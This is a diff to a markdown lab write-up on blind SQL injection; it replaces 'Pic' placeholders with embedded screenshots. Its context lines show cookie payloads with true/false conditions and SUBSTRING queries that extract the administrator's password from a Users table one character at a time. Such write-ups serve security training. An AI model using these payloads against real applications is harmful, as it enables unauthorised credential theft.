@@ -25,7 +25,8 @@ References:
 
 The SQL injection point is the tracking cookie.
 
-**Pic 1**
+<img width="576" height="340" alt="1" src="https://github.com/user-attachments/assets/38e2a5a2-fd47-429e-a267-78378c7faf94" />
+
 
 A true condition causes the application to display `Welcome back!`:
 
@@ -33,7 +34,8 @@ A true condition causes the application to display `Welcome back!`:
 Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='1;
 ```
 
-**Pic 2**
+<img width="1001" height="372" alt="2" src="https://github.com/user-attachments/assets/2f6a83e7-c270-4161-87fd-cff2cc2854c7" />
+
 
 When the condition is false, the message is not displayed:
 
@@ -41,7 +43,8 @@ When the condition is false, the message is not displayed:
 Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='0;
 ```
 
-**Pic 3**
+<img width="999" height="371" alt="3" src="https://github.com/user-attachments/assets/bcd7bf2f-8704-4468-8b65-9714e104a8a8" />
+
 
 This true/false behavior can be used to test individual password
 characters. For example, the following condition checks whether the
@@ -59,7 +62,8 @@ Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+W
 
 The request can then be sent to Intruder to test possible characters.
 
-**Pic 4**
+<img width="485" height="100" alt="4" src="https://github.com/user-attachments/assets/533fbb95-ccad-4e9f-b9dc-0166e4ce8b71" />
+
 
 The first character is confirmed as `s`, so the next position can be
 tested:
@@ -72,7 +76,8 @@ c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,2
 Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,2)='ss
 ```
 
-**Pic 5**
+<img width="433" height="145" alt="5" src="https://github.com/user-attachments/assets/a10616fb-715e-4e0b-aae9-c82886a094d9" />
+
 
 A more efficient approach is to test one character position at a time:
 
